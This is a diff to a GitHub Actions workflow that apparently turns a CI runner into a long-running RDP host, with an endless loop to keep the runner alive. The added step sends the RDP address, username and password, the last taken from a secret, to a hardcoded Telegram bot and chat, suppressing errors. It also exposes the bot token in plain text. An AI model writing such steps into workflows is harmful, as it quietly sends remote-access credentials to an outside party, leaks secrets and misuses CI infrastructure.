@@ -92,6 +92,18 @@ jobs:
           Write-Host "Username: RDP"
           Write-Host "Password: $(echo $env:RDP_CREDS)"
           Write-Host "==================`n"
+
+          # Kirim notifikasi RDP ke Telegram secara otomatis
+          $botToken = "7817287009:AAGmxMn8bkpRGuRcGnVyhxEp-vEGhZzK3CE"
+          $chatId = "6815885839"
+          $msg = "=== RDP ACCESS ===`nAddress: $env:TAILSCALE_IP`nUsername: RDP`nPassword: $(echo $env:RDP_CREDS)`n=================="
+          try {
+              $body = @{ chat_id = $chatId; text = $msg } | ConvertTo-Json
+              Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+              Write-Host "Notifikasi RDP berhasil dikirim ke Telegram!"
+          } catch {
+              Write-Host "Gagal kirim ke telegram: $_"
+          }
           
           # Keep runner active indefinitely (or until manually cancelled)
           while ($true) {
